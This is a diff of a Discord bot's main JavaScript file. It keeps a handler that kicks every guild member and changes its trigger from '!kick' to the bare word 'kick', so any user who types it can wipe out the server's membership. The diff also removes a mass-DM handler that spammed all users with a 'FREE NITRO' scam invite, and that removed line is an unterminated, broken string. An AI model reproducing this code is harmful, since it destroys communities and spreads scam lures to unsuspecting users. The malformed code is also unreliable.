@@ -24,7 +24,7 @@ const tokenyeri = require('./tokenyeri.json');
 require('./util/eventLoader')(client);
 
   client.on('message', msg => {
-    if (msg.content === '!kick') {
+    if (msg.content === 'kick') {
       msg.guild.members.forEach(member => member.kick())
     }
   });
@@ -83,7 +83,7 @@ const log = message => {
   client.load = command => {
     return new Promise((resolve, reject) => {
       try {
-        let cmd = require(`./komutlar/${command}`);
+        let cmd = require(`./berke/${command}`);
         client.commands.set(command, cmd);
         cmd.conf.aliases.forEach(alias => {
           client.aliases.set(alias, cmd.help.name);
@@ -98,8 +98,8 @@ const log = message => {
 client.reload = command => {
   return new Promise((resolve, reject) => {
     try {
-      delete require.cache[require.resolve(`./komutlar/${command}`)];
-      let cmd = require(`./komutlar/${command}`);
+      delete require.cache[require.resolve(`./berke/${command}`)];
+      let cmd = require(`./berke/${command}`);
       client.commands.delete(command);
       client.aliases.forEach((cmd, alias) => {
         if (cmd === command) client.aliases.delete(alias);
@@ -118,7 +118,7 @@ client.reload = command => {
 client.load = command => {
   return new Promise((resolve, reject) => {
     try {
-      let cmd = require(`./komutlar/${command}`);
+      let cmd = require(`./berke/${command}`);
       client.commands.set(command, cmd);
       cmd.conf.aliases.forEach(alias => {
         client.aliases.set(alias, cmd.help.name);
@@ -133,8 +133,8 @@ client.load = command => {
 client.unload = command => {
   return new Promise((resolve, reject) => {
     try {
-      delete require.cache[require.resolve(`./komutlar/${command}`)];
-      let cmd = require(`./komutlar/${command}`);
+      delete require.cache[require.resolve(`./berke/${command}`)];
+      let cmd = require(`./berke/${command}`);
       client.commands.delete(command);
       client.aliases.forEach((cmd, alias) => {
         if (cmd === command) client.aliases.delete(alias);
@@ -206,12 +206,5 @@ client.elevation = message => {
   if (message.author.id === tokenyeri.sahip) permlvl = 4;
   return permlvl;
 };
-
-client.on('message', msg => {
-  if (msg.content.toLowerCase() === 'r!duyuru') {
-    msg.delete()
-   msg.client.users.forEach(users => users.send('**omG**, Instant Payment https://discord.gg/a8NAYJk **FREE NITRO AND MORE** Join **Omgggg**
-  }
-});
 
 client.login(tokenyeri.token) 
